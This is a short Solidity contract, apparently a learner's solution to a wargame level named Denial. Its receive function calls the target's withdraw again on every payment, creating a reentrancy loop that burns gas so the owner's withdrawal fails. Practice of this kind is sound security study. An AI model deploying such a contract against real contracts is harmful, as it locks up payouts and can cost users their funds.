// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";
import "hardhat/console.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial public denial;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
        denial = Denial(contractAddress);
    }

    //Code me!
    // we can write a function here to respond to the "call" function that comes from the Denial contract
    // we aren't getting any data, just a message value, so I think that's the receive function

    receive () external payable {
        console.log("INVOKED");
        // what if we just keep hitting withdraw ourselves? it'd keep a loop of code running since the partner 
        // get paid before owner, burning gas.
        denial.withdraw();
    }
}
